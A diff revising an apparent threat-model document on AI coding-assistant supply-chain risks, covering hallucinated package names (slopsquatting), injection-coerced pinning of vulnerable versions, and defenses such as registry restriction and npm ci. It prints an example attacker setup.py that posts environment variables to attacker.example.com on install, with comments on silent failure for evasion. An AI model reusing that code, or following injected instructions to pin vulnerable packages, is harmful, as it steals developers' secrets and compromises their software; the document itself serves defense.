@@ -65,25 +65,32 @@ This is the threat model's most important property: **the human is still in the 
 
 ### Package hallucination (slopsquatting)
 
-AI coding assistants sometimes suggest package names that don't exist. This has been documented through several studies — Lanyado et al. at Vulcan Security published research in 2024 demonstrating that LLMs hallucinate package names at a non-trivial rate, and that many of those names can be registered on PyPI or npm.
+AI coding assistants sometimes suggest package names that don't exist. This has been documented through several studies — Lanyado et al. at Vulcan Cyber published research in 2023 (with follow-on coverage in 2024) demonstrating that LLMs hallucinate package names at a non-trivial rate, and that many of those names can be registered on PyPI or npm.
 
 The attack pattern: an attacker monitors for hallucinated package names that appear repeatedly in model suggestions (either through probing or passive observation), registers those packages with malicious payloads, and waits for developers who accept the suggestion and run their package manager.
 
-The malicious package needs only to exist and install. A `setup.py` or `postinstall` script that exfiltrates environment variables or writes a persistence mechanism to the developer's machine runs before any code review.
+The malicious package needs only to exist and install. For npm packages, a `postinstall` script in `package.json` runs at install time. For PyPI, source distributions (`sdist`) can execute a `setup.py` on install; binary wheels (`whl`) do not run `setup.py`, but can still include malicious entry points. In both ecosystems, execution happens before any application-level code review of the package.
 
 ```python
-# An attacker-registered package's setup.py
+# An attacker-registered package's setup.py (sdist install)
 from setuptools import setup
 import os, requests
 
-# Exfiltrate developer environment on install
+# Exfiltrate developer environment on install.
+# Note: the silent except is intentional — detection-evasion.
+# An install that errors out draws attention; one that silently
+# continues looks like a successful package install.
 try:
-    requests.post("https://attacker.example.com/collect", 
+    requests.post("https://attacker.example.com/collect",
                   data=dict(os.environ), timeout=2)
 except Exception:
-    pass  # Fail silently
+    pass
 
-setup(name="ai-utils-helper", version="1.0.0", ...)
+setup(
+    name="ai-utils-helper",
+    version="1.0.0",
+    packages=[],
+)
 ```
 
 This is not hypothetical: the underlying technique (typosquatting and malicious `postinstall` scripts) is well-established in the npm and PyPI ecosystems. AI hallucination creates a new vector for generating plausible-looking target package names.
@@ -92,11 +99,12 @@ This is not hypothetical: the underlying technique (typosquatting and malicious 
 
 A more targeted variant: an injection-capable attacker coerces the model into suggesting a specific version of a legitimate package — one that contains a known vulnerability, or one that the attacker has managed to compromise at the registry level (a separate supply chain attack, but compatible with this one).
 
-```json
+```jsonc
 // Suggested by AI assistant (potentially coerced)
 {
   "dependencies": {
-    "axios": "1.3.2"  // Specific older version with CVE-2023-45857
+    // Pinned to a specific older version with a known vulnerability
+    "axios": "1.3.2"
   }
 }
 ```
@@ -216,11 +224,15 @@ A CI environment that allows unrestricted outbound network access from test jobs
 ### Dependency allowlisting and provenance tracking
 
 ```yaml
-# .npmrc or similar: restrict to approved registry
+# .npmrc: restrict to approved registry
 registry=https://your-internal-registry.example.com
+```
 
-# Verify package integrity
-npm install --audit --frozen-lockfile
+```sh
+# Prefer npm ci (respects lockfile strictly) over npm install
+npm ci
+# Run a separate audit step
+npm audit --audit-level=moderate
 ```
 
 More broadly:
@@ -238,7 +250,7 @@ Limit what third-party content reaches the model's context window:
 
 ### SBOM-level tracking of AI-assisted changes
 
-Emerging practice in the field: annotating commits that include AI-assisted code with a standardized marker. This is already being developed as a proposal within the SPDX and CycloneDX SBOM frameworks. If an organization tracks AI-assisted commits, it becomes possible to:
+Emerging practice in the field: annotating commits that include AI-assisted code with a standardized marker. Discussion of AI-provenance fields has appeared in the context of SPDX and CycloneDX SBOM standards, though as of mid-2026 no finalized specification has been widely adopted. Organizations can implement their own convention (e.g., a `Co-Authored-By: ai-assistant` trailer in commit messages) without waiting for standardization. If an organization tracks AI-assisted commits, it becomes possible to:
 
 - Audit AI-assisted changes separately from human-written code
 - Apply enhanced review requirements to AI-suggested dependencies specifically
